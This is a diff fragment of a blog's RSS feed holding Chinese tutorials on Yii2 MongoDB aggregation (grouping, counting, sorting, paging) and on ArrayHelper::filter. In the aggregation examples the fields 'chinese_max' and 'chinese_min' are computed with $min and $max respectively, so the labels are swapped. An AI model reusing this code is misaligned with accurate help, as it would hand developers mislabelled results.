+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的结果如图所示：
+&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-15_17-48-52.jpg&#34; alt=&#34;数据内容&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;92-根据班级性别进行分组同时获取该分组下的人数&#34;&gt;9.2 根据班级、性别进行分组，同时获取该分组下的人数&lt;/h4&gt;
+&lt;p&gt;分组需要使用到聚合表达式的&lt;code&gt;$group&lt;/code&gt;，其功能如同MySQL的group，作为分组依据的同时也作为筛选字段；统计人数则是表达式&lt;code&gt;$sum&lt;/code&gt;，而&lt;code&gt;&#39;$sum&#39;=&amp;gt;1&lt;/code&gt;是如果满足条件的话该值就加一，代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$aggregate&lt;/span&gt; = [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	[  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$group&amp;#39;&lt;/span&gt; =&amp;gt; [  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;_id&amp;#39;&lt;/span&gt;=&amp;gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;class&amp;#34;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$class&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;sex&amp;#34;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$sex&amp;#39;&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;count&amp;#34;&lt;/span&gt;=&amp;gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$sum&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;aggregate&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$aggregate&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的结果如图所示：
+&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-15_17-55-30.jpg&#34; alt=&#34;数据内容&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;93-在92的条件基础上获取到该分组下语文分数的最高分最低分和平均分&#34;&gt;9.3 在9.2的条件基础上，获取到该分组下语文分数的最高分、最低分和平均分&lt;/h4&gt;
+&lt;p&gt;这里需要使用到三个聚合表达式，分别为：最大值（&lt;code&gt;$max&lt;/code&gt;），最小值（&lt;code&gt;$min&lt;/code&gt;），平均值（&lt;code&gt;$avg&lt;/code&gt;），代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$aggregate&lt;/span&gt; = [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	[  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$group&amp;#39;&lt;/span&gt; =&amp;gt; [  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;_id&amp;#39;&lt;/span&gt;=&amp;gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;class&amp;#34;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$class&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;sex&amp;#34;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$sex&amp;#39;&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;count&amp;#34;&lt;/span&gt;=&amp;gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$sum&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;chinese_max&amp;#34;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$min&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$chinese&amp;#39;&lt;/span&gt;],  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;chinese_min&amp;#34;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$max&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$chinese&amp;#39;&lt;/span&gt;],  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;chinese_avg&amp;#34;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$avg&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$chinese&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 ]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;aggregate&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$aggregate&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的结果如图所示：
+&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-15_18-07-32.jpg&#34; alt=&#34;数据内容&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;94-在93的基础上根据语文分数最大值由高到低排序&#34;&gt;9.4 在9.3的基础上根据语文分数最大值由高到低排序&lt;/h4&gt;
+&lt;p&gt;这里需要使用到的表达式为&lt;code&gt;$sort&lt;/code&gt;，当值为1时为升序，-1为降序，代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$aggregate&lt;/span&gt; = [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	[  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$group&amp;#39;&lt;/span&gt; =&amp;gt; [  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;_id&amp;#39;&lt;/span&gt;=&amp;gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;class&amp;#34;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$class&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;sex&amp;#34;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$sex&amp;#39;&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;count&amp;#34;&lt;/span&gt;=&amp;gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$sum&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;chinese_max&amp;#34;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$min&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$chinese&amp;#39;&lt;/span&gt;],  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;chinese_min&amp;#34;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$max&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$chinese&amp;#39;&lt;/span&gt;],  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;chinese_avg&amp;#34;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$avg&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$chinese&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 ],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 [  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$sort&amp;#39;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;chinese_max&amp;#39;&lt;/span&gt;=&amp;gt;-&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;]  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 ],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;aggregate&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$aggregate&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的结果如图所示：
+&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-15_18-13-30.jpg&#34; alt=&#34;数据内容&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;95-在94的基础上分页&#34;&gt;9.5 在9.4的基础上分页&lt;/h4&gt;
+&lt;p&gt;这里需要使用的聚合表达式为&lt;code&gt;$limit&lt;/code&gt;和&lt;code&gt;$skip&lt;/code&gt;，&lt;code&gt;$skip&lt;/code&gt;为跳过指定条数后显示之后的内容，而&lt;code&gt;$limit&lt;/code&gt;则是显示多少条 ，因为进行链式操作，所以&lt;code&gt;$skip&lt;/code&gt;和&lt;code&gt;$limit&lt;/code&gt;的顺序不能出错，代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$page&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;request&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;page&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;);  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$limit&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;request&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;limit&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#b452cd&#34;&gt;3&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$aggregate&lt;/span&gt; = [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	[  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$group&amp;#39;&lt;/span&gt; =&amp;gt; [  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;_id&amp;#39;&lt;/span&gt;=&amp;gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;class&amp;#34;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$class&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;sex&amp;#34;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$sex&amp;#39;&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;count&amp;#34;&lt;/span&gt;=&amp;gt;[&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$sum&amp;#39;&lt;/span&gt;=&amp;gt;&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;chinese_max&amp;#34;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$min&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$chinese&amp;#39;&lt;/span&gt;],  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;chinese_min&amp;#34;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$max&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$chinese&amp;#39;&lt;/span&gt;],  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;chinese_avg&amp;#34;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$avg&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$chinese&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 ],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 [  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$sort&amp;#39;&lt;/span&gt; =&amp;gt; [&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;chinese_max&amp;#39;&lt;/span&gt;=&amp;gt;-&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;]  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 ],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 [  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$skip&amp;#39;&lt;/span&gt; =&amp;gt; --&lt;span style=&#34;color:#00688b&#34;&gt;$page&lt;/span&gt; * &lt;span style=&#34;color:#00688b&#34;&gt;$limit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 ],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 [  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;$limit&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#00688b&#34;&gt;$limit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 ],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = \Yii::&lt;span style=&#34;color:#00688b&#34;&gt;$app&lt;/span&gt;-&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;mongodb&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getDatabase&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;getCollection&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;)  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  -&amp;gt;&lt;span style=&#34;color:#658b00&#34;&gt;aggregate&lt;/span&gt;(&lt;span style=&#34;color:#00688b&#34;&gt;$aggregate&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var_dump(&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt;); 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到的结果如图所示：
+&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-07-15_18-38-05.jpg&#34; alt=&#34;数据内容&#34;&gt;&lt;/p&gt;
+- https://jadenhsiao.gitee.io/post/yii2-skills-part-two/ - Jadenhsiao. 本站遵循 CC-BY-NC 4.0 协议</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Yii2使用技巧（一）- 数组辅助工具</title>
+        <link>https://jadenhsiao.gitee.io/post/yii2-skills-part-one/</link>
+        <pubDate>Wed, 16 Mar 2022 23:36:28 +0800</pubDate>
+        
+        <guid>https://jadenhsiao.gitee.io/post/yii2-skills-part-one/</guid>
+        <description>JadenHsiao https://jadenhsiao.gitee.io/post/yii2-skills-part-one/ -&lt;blockquote&gt;
+&lt;p&gt;因为公司主线业务使用的是 Yii2，所以该系列文章主要是平时工作中使用 Yii2 框架的技巧总结，希望可以让开发者更多地使用 Yii2 框架提供的特性，编写出更加规范化和可读性更高的业务代码；Yii2 官方提供的数组工具非常实用，这里根据使用经验展开说明。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;一数组筛选yiihelperarrayhelperfilter&#34;&gt;一、数组筛选（\yii\helper\ArrayHelper::filter）&lt;/h2&gt;
+&lt;p&gt;该函数在 Yii2.0 的权威指南中数组助手类并没有看到，而是在 API 文档中查阅到的，主要功能是根据指定的规则筛选数组，但是这个函数有使用条件，就是只能在两维或以下的数组中使用。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://jadenhsiao.gitee.io/images/Snipaste_2022-03-16_23-51-11.png&#34; alt=&#34;API 文档说明&#34;&gt;&lt;/p&gt;
+&lt;p&gt;从上图可以看到，该函数有两个参数，第一个参数是待处理的数组，第二个参数是筛选的规则（格式也是数组）；其中规则支持，筛选（排除）出一维或二维指定字段；下面就由一个简单的示例来说明该函数的作用。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;actionExample&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#00688b&#34;&gt;$example&lt;/span&gt; = [
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;jack&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;sex&amp;#39;&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#39;man&amp;#39;&lt;/span&gt;,
